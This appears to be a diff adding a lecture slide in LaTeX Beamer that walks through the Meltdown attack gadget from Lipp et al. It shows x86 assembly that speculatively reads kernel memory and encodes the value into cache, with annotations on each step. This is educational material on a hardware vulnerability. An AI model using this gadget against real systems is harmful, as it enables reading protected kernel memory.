@@ -1,0 +1,60 @@
+\begin{frame}[fragile]{Meltdown}
+
+{\small from Lipp et al, ``Meltdown: Reading Kernel Memory from User Space''} \\
+\lstset{
+    language=myasm,
+    style=small,
+    moredelim={**[is][\btHL<2>]{@2}{2@}},
+    moredelim={**[is][\btHL<3>]{@3}{3@}},
+    moredelim={**[is][\btHL<4>]{@4}{4@}},
+    moredelim={**[is][\btHL<5>]{@5}{5@}},
+}
+\begin{lstlisting}
+    // %rcx = kernel address
+    // %rbx = array to load from to cause eviction
+    xor %rax, %rax      // rax <- 0
+retry:
+    // rax <- memory[kernel address] (segfaults)
+        // but check for segfault done out-of-order on Intel at time
+    @5movb (%rcx), %al5@
+    // rax <- memory[kernel address] * 4096 [speculated]
+    @2shl $0xC, %rax2@
+    @3jz retry3@                // not-taken branch
+    // access array[memory[kernel address] * 4096]
+    @4mov (%rbx, %rax), %rbx4@
+\end{lstlisting}
+\begin{tikzpicture}[overlay,remember picture]
+\coordinate (box place) at ([yshift=0.25cm]current page.center);
+\tikzset{
+    box/.style={at=(box place), anchor=south,align=left,fill=white,draw=red,ultra thick}
+}
+\begin{visibleenv}<2>
+\node[box] {space out accesses by 4096 \\
+ensure separate cache sets and \\
+avoid triggering prefetcher
+};
+\end{visibleenv}
+\begin{visibleenv}<3>
+\node[box] {
+    repeat access if zero \\
+    apparently value of zero speculatively read \\
+    when real value not yet available
+};
+\end{visibleenv}
+\begin{visibleenv}<4>
+\node[box] {
+    access cache to allow measurement later \\
+    in paper not with FLUSH+RELOAD instead \\\
+    of PRIME+PROBE technique
+};
+\end{visibleenv}
+\begin{visibleenv}<5>
+\node[box] {
+    segfault actually happens eventually \\
+    option 1: okay, just start a new process every time \\
+    option 2: way of suppressing exception (transactional memory support)
+};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
